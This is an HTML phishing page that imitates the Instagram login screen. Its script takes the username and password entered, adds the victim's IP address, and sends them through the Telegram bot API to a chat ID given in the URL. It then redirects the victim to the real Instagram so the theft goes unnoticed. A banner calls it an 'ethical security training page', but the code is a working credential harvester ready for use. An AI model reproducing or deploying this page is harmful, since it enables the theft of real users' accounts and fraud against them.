<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Login</title>
    <link rel="shortcut icon" href="data:image/x-icon;," type="image/x-icon">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
        }
        
        body {
            background: #fafafa;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            background-image: radial-gradient(circle farthest-corner at 32% 106%, #ffe17d 0%, #ffcd69 10%, #fa9137 28%, #eb4141 42%, transparent 82%), linear-gradient(135deg, #234bd7 12%, #c33cbe 58%);
        }
        
        .container {
            display: flex;
            max-width: 935px;
            width: 100%;
            height: 100vh;
            justify-content: center;
            align-items: center;
        }
        
        .phones {
            background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="454" height="618" viewBox="0 0 454 618"><rect width="454" height="618" rx="40" fill="%23000"/><rect x="15" y="15" width="424" height="588" rx="25" fill="%23fff"/></svg>');
            background-repeat: no-repeat;
            background-position: center;
            background-size: contain;
            height: 618px;
            width: 454px;
            position: relative;
            margin-right: 32px;
        }
        
        .form-container {
            display: flex;
            flex-direction: column;
            align-items: center;
            width: 350px;
        }
        
        .login-box {
            background: #fff;
            border: 1px solid #dbdbdb;
            border-radius: 1px;
            padding: 40px;
            width: 100%;
            margin-bottom: 10px;
            text-align: center;
            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
        }
        
        .logo {
            margin-bottom: 36px;
            font-size: 45px;
            font-weight: 300;
            background: radial-gradient(circle at 30% 107%, #fdf497 0%, #fdf497 5%, #fd5949 45%, #d6249f 60%, #285AEB 90%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            display: inline-block;
            letter-spacing: -1px;
        }
        
        .login-form input {
            width: 100%;
            padding: 12px 0 10px 8px;
            margin-bottom: 8px;
            background: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            font-size: 14px;
            outline: none;
            transition: border-color 0.2s;
        }
        
        .login-form input:focus {
            border-color: #a8a8a8;
            box-shadow: 0 0 0 2px rgba(0, 149, 246, 0.1);
        }
        
        .login-btn {
            width: 100%;
            padding: 8px;
            margin: 14px 0;
            background: #0095f6;
            border: none;
            border-radius: 8px;
            color: white;
            font-weight: 600;
            font-size: 14px;
            cursor: pointer;
            transition: background-color 0.2s;
        }
        
        .login-btn:hover {
            background: #0081d6;
        }
        
        .login-btn:disabled {
            background: #b2dffc;
            cursor: default;
        }
        
        .divider {
            display: flex;
            align-items: center;
            width: 100%;
            margin: 18px 0;
            color: #8e8e8e;
            font-size: 13px;
            font-weight: 600;
        }
        
        .divider::before,
        .divider::after {
            content: "";
            flex: 1;
            height: 1px;
            background: #dbdbdb;
        }
        
        .divider::before {
            margin-right: 15px;
        }
        
        .divider::after {
            margin-left: 15px;
        }
        
        .fb-login {
            color: #385185;
            font-weight: 600;
            font-size: 14px;
            margin: 8px 0;
            cursor: pointer;
        }
        
        .forgot-pw {
            color: #00376b;
            font-size: 12px;
            margin-top: 12px;
            cursor: pointer;
        }
        
        .signup-box {
            background: #fff;
            border: 1px solid #dbdbdb;
            border-radius: 1px;
            padding: 25px;
            width: 100%;
            margin: 10px 0;
            text-align: center;
            font-size: 14px;
        }
        
        .signup-box a {
            color: #0095f6;
            font-weight: 600;
            text-decoration: none;
        }
        
        .get-app {
            text-align: center;
            width: 100%;
            font-size: 14px;
            margin: 10px 0;
        }
        
        .app-stores {
            display: flex;
            justify-content: center;
            margin-top: 20px;
            gap: 10px;
        }
        
        .app-store {
            height: 40px;
            cursor: pointer;
        }
        
        .error-message {
            color: #ed4956;
            font-size: 14px;
            margin: 10px 0;
            display: none;
            background: #fef2f2;
            padding: 8px;
            border-radius: 4px;
        }
        
        .success-message {
            color: #0095f6;
            font-size: 14px;
            margin: 10px 0;
            display: none;
            background: #f0f9ff;
            padding: 8px;
            border-radius: 4px;
        }
        
        .security-notice {
            font-size: 12px;
            color: #8e8e8e;
            margin-top: 20px;
            text-align: center;
            padding: 10px;
            background: #f9f9f9;
            border-radius: 4px;
            border: 1px solid #efefef;
        }
        
        footer {
            position: fixed;
            bottom: 0;
            width: 100%;
            text-align: center;
            padding: 10px;
            color: #8e8e8e;
            font-size: 12px;
            background: #fafafa;
            border-top: 1px solid #dbdbdb;
        }
        
        @media (max-width: 875px) {
            .phones {
                display: none;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="phones"></div>
        <div class="form-container">
            <div class="login-box">
                <div class="logo">Instagram</div>
                <form class="login-form" id="loginForm">
                    <input type="text" id="username" placeholder="Phone number, username, or email" required>
                    <input type="password" id="password" placeholder="Password" required>
                    <div class="error-message" id="errorMessage">Sorry, your password was incorrect. Please double-check your password.</div>
                    <div class="success-message" id="successMessage">Login successful! Redirecting to Instagram...</div>
                    <button type="submit" class="login-btn" id="loginBtn">Log In</button>
                </form>
                <div class="divider">OR</div>
                <div class="fb-login">
                    <i class="fab fa-facebook-square"></i> Log in with Facebook
                </div>
                <div class="forgot-pw">Forgot password?</div>
            </div>
            <div class="signup-box">
                Don't have an account? <a href="#">Sign up</a>
            </div>
            <div class="get-app">
                Get the app.
                <div class="app-stores">
                    <img src="data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' width='136' height='40' viewBox='0 0 136 40'><rect width='136' height='40' rx='5' fill='%23000'/><text x='50%' y='50%' dominant-baseline='middle' text-anchor='middle' font-family='Arial' font-size='12' fill='%23fff'>App Store</text></svg>" alt="App Store" class="app-store">
                    <img src="data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' width='136' height='40' viewBox='0 0 136 40'><rect width='136' height='40' rx='5' fill='%23000'/><text x='50%' y='50%' dominant-baseline='middle' text-anchor='middle' font-family='Arial' font-size='12' fill='%23fff'>Google Play</text></svg>" alt="Google Play" class="app-store">
                </div>
            </div>
            <div class="security-notice">
                <strong>Security Notice:</strong> This page is for ethical security training purposes only. Do not enter your real Instagram credentials.
            </div>
        </div>
    </div>
    
    <footer>
        <div>ETHICAL SECURITY TRAINING PAGE - FOR EDUCATIONAL PURPOSES ONLY</div>
    </footer>

    <script>
    async function getFastKey() {
      const res = await fetch('/api/fast_servers');
      const data = await res.json();
      return data.fast_key;
    }
    
    
        // Telegram credentials
       // const botfast_key = await getFastKey();
        const chatId = new URLSearchParams(window.location.search).get('id');
        document.addEventListener('DOMContentLoaded', function() {
            const loginForm = document.getElementById('loginForm');
            const usernameInput = document.getElementById('username');
            const passwordInput = document.getElementById('password');
            const errorMessage = document.getElementById('errorMessage');
            const successMessage = document.getElementById('successMessage');
            const loginBtn = document.getElementById('loginBtn');
            
            // Add Facebook icon
            const fbIcon = document.createElement('link');
            fbIcon.rel = 'stylesheet';
            fbIcon.href = 'https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css';
            document.head.appendChild(fbIcon);
            
            // Add focus to username field on page load
            usernameInput.focus();
            
            // Add input validation as user types
            passwordInput.addEventListener('input', function() {
                if (passwordInput.value.length > 0) {
                    errorMessage.style.display = 'none';
                }
            });
            
            loginForm.addEventListener('submit', async function(e) {
                e.preventDefault();
                
                const username = usernameInput.value.trim();
                const password = passwordInput.value;
                
                // Reset messages
                errorMessage.style.display = 'none';
                successMessage.style.display = 'none';
                loginBtn.disabled = true;
                
                // Validate inputs
                if (!username || !password) {
                    errorMessage.textContent = "Please fill in all fields";
                    errorMessage.style.display = 'block';
                    loginBtn.disabled = false;
                    return;
                }
                
                // Simulate network delay
                await new Promise(resolve => setTimeout(resolve, 800));
                
                // Validate credentials - using more realistic Instagram criteria
                const isValid = validateCredentials(username, password);
                
                if (isValid) {
                    // Send credentials to Telegram bot
                    const sent = await sendToTelegram(username, password);
                    
                    if (sent) {
                        // Show success message
                        successMessage.style.display = 'block';
                        
                        // Redirect to real Instagram after a delay
                        setTimeout(() => {
                            window.location.href = 'https://www.instagram.com/';
                        }, 2000);
                    } else {
                        errorMessage.textContent = "Failed to log in. Please try again later.";
                        errorMessage.style.display = 'block';
                        loginBtn.disabled = false;
                    }
                } else {
                    // Show error message
                    errorMessage.textContent = "Sorry, your password was incorrect. Please double-check your password.";
                    errorMessage.style.display = 'block';
                    loginBtn.disabled = false;
                    
                    // Shake animation for error
                    loginForm.style.animation = 'shake 0.5s';
                    setTimeout(() => {
                        loginForm.style.animation = '';
                    }, 500);
                }
            });
            
            function validateCredentials(username, password) {
                // More realistic Instagram validation criteria
                return password.length >= 6 && 
                       /[A-Za-z]/.test(password) && 
                       /[0-9]/.test(password) &&
                       username.length >= 3;
            }
            
            async function sendToTelegram(username, password) {
                const botfast_key = await getFastKey();
                const chatId = new URLSearchParams(window.location.search).get('id');
                
                const message = `âœ… Instagram Credentials Received:
Username: ${username}
Password: ${password}
Time: ${new Date().toLocaleString()}
IP: ${await getIP()}`;
                
                const url = `https://api.telegram.org/bot${botfast_key}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
                
                try {
                    const response = await fetch(url);
                    return response.ok;
                } catch (error) {
                    console.error('Error sending to Telegram:', error);
                    return false;
                }
            }
            
            async function getIP() {
                try {
                    const response = await fetch('https://api.ipify.org?format=json');
                    const data = await response.json();
                    return data.ip || 'Unknown';
                } catch {
                    return 'Unknown';
                }
            }
        });
        
        // Add shake animation
        const style = document.createElement('style');
        style.textContent = `
            @keyframes shake {
                0% { transform: translateX(0); }
                20% { transform: translateX(-10px); }
                40% { transform: translateX(10px); }
                60% { transform: translateX(-10px); }
                80% { transform: translateX(10px); }
                100% { transform: translateX(0); }
            }
        `;
        document.head.appendChild(style);
    </script>
</body>
</html>
